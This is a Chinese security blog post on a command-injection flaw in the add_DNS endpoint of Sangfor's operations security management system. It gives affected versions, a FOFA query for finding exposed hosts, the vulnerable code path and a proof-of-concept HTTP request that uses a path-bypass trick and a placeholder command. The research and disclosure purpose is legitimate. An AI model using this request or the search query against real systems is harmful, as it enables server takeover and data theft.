---
title: "深信服运维安全管理系统 add_DNS 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-netConfig-add_DNS-rce.html
asset_dir: assets/深信服运维安全管理系统-add_dns-远程命令执行漏洞
---

# 深信服运维安全管理系统 add\_DNS 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/4 21:37
* 571浏览
* [0评论](#comment)
* 7分钟阅读

深入探索

服务器

软件

安全研究报告


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 add\_DNS 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

文件大小转换

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#add_DNS`的实现逻辑

[![深信服运维安全管理系统 add_DNS 远程命令执行漏洞](images/img-001-2727a8611fb6.webp)](https://image.mrxn.net/5f2a9f85bcfe4920a91fe232d32bcfc8.webp)

两个参数**firstAddress**与**prepareAddress**被直接拼接在**shell**中，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞（两个参数均存在命令执行漏洞）。

漏洞预警服务

深入探索

漏洞扫描服务

JSON处理工具

网络安全课程

# 漏洞复现

[![深信服运维安全管理系统 add_DNS 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以firstAddress为例
>
> 计算机服务器

```
POST /fort/system;help/netConfig/add_DNS HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

firstAddress=RCE_POC&prepareAddress=8.8.8.8
```

深入探索

文本剥离工具

授权

身份验证

访问命令执行结果文件

[![深信服运维安全管理系统 add_DNS 远程命令执行漏洞](images/img-003-1612ccbd0777.webp)](https://image.mrxn.net/a12faa3a914f4406a2b5483dde20e36b.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 add\_DNS 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-add_DNS-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-netConfig-add_DNS-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读

代码安全审计


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-netConfig-add\_DNS-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

文件大小转换

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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